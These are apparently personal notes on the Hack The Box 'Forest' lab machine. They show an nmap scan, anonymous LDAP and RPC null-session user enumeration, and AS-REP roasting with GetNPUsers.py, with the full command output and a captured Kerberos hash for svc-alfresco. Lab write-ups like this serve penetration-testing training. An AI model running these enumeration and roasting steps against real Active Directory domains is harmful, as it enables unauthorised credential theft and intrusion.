
https://app.hackthebox.com/machines/Forest

```
nmap -sCV -v -p- -T4 10.129.95.210 -oA nmap/forest
...
Discovered open port 135/tcp on 10.129.95.210
Discovered open port 445/tcp on 10.129.95.210
Discovered open port 139/tcp on 10.129.95.210
Discovered open port 53/tcp on 10.129.95.210
Discovered open port 49667/tcp on 10.129.95.210
Discovered open port 49666/tcp on 10.129.95.210
Discovered open port 49681/tcp on 10.129.95.210
Discovered open port 593/tcp on 10.129.95.210
Discovered open port 49685/tcp on 10.129.95.210
Discovered open port 3268/tcp on 10.129.95.210
Discovered open port 47001/tcp on 10.129.95.210
Discovered open port 5985/tcp on 10.129.95.210
Discovered open port 49857/tcp on 10.129.95.210
Discovered open port 3269/tcp on 10.129.95.210
Discovered open port 88/tcp on 10.129.95.210
Discovered open port 49671/tcp on 10.129.95.210
Discovered open port 9389/tcp on 10.129.95.210
Discovered open port 389/tcp on 10.129.95.210
Discovered open port 49664/tcp on 10.129.95.210
Discovered open port 49665/tcp on 10.129.95.210
Discovered open port 464/tcp on 10.129.95.210
Discovered open port 49680/tcp on 10.129.95.210
Discovered open port 636/tcp on 10.129.95.210
Discovered open port 49700/tcp on 10.129.95.210
...
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-03-28 10:06:53Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        Microsoft Windows RPC
49685/tcp open  msrpc        Microsoft Windows RPC
49700/tcp open  msrpc        Microsoft Windows RPC
49857/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-28T10:07:42
|_  start_date: 2026-03-28T09:59:13
|_clock-skew: mean: 2h26m50s, deviation: 4h02m31s, median: 6m49s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-03-28T03:07:44-07:00

```

nxc ldap 10.129.95.210 -u '' -p '' --users

![[nxc-ldap-forest.png]]

------

rpcclient -U "" -N 10.129.95.210 -c "enumdomusers"

this command pulls a user list

**RPC (Remote Procedure Call)**. 
On older or misconfigured Windows Servers (like **Forest**), the RPC service often leaks more information than LDAP does.

- **`rpcclient`**: A tool used to execute client-side MS-RPC functions. It’s the "swiss army knife" for interacting with Windows RPC services from Linux.

- **`-U ""`**: Specifies the **Username**. By leaving it empty `""`, you are telling the server you want to connect as an **Anonymous/Null user**.

- **`-N`**: Stands for **No Password**. This prevents the tool from prompting you for a password, which is necessary for a null session.

- **`10.129.95.210`**: The IP address of the Domain Controller (the Forest box).

- **`-c "enumdomusers"`**: The **Command** flag. Instead of opening an interactive shell, it runs the specific function `enumdomusers` (Enumerate Domain Users) and exits.


-----

```
rpcclient -U "" -N 10.129.95.210 -c "enumdomusers"
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

```

rpcclient -U "" -N 10.129.95.210 -c "enumdomusers" | awk -F'[][]' '{print $2}' > forest-users.txt
                                                                                                                                                                         
┌──(lanc3㉿kali)-[~]
└─$ cat forest-users.txt 
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi

-----

Strategy is to use **AS-REP Roasting** to find _initial_ entry point user.

--------

`GetNPUsers.py` (AS-REP Roasting)

"cousin" of Kerberoasting. It targets users who have the setting **"Do not require Kerberos preauthentication"** enabled.

- **When to use:** Early in the game, often before having any credentials.

- **Why it's great:** get a crackable hash for a user without ever sending a single password attempt.
 
- **Command:** `GetNPUsers.py htb.local/ -usersfile forest-users.txt -format hashcat -dc-ip 10.129.95.210

domain:htb.local

so command is 


`GetNPUsers.py htb.local/ -usersfile forest-users.txt -format hashcat -dc-ip 10.129.95.210

![[GetNPUsers.png]]

```

$krb5asrep$23$svc-alfresco@HTB.LOCAL:8f10010845670af2af2c0fad11fef2b2$b664c92b31bc49cba9ddc4d1bdfef98d7c71c16a527296a99ab805d87ed6b700c8803a731276c3789904b2ce68aa62cd18f83541c89a66e5cd940d55381e9b20ac9072b7799a5895052e1e868fb90be1fa5930ae206ce8bf9716fbad54180079ed0f184dbadfa54c78988d2e23c33fa3e2a8a51d022369f901b4050145a920fb927e4aa91c13a35edaa349abded165718814d91e3bc4f3d40ff882baf1c5890b47e29ed1ea9aae3466f354e62b5d91495089daa64d3cc2f3298cdc2fe6d99cbca4c434141e7775a2b4d171dab1c4ea07b3e2a014dfe2395c75be003d400b1acb1036847301f1

```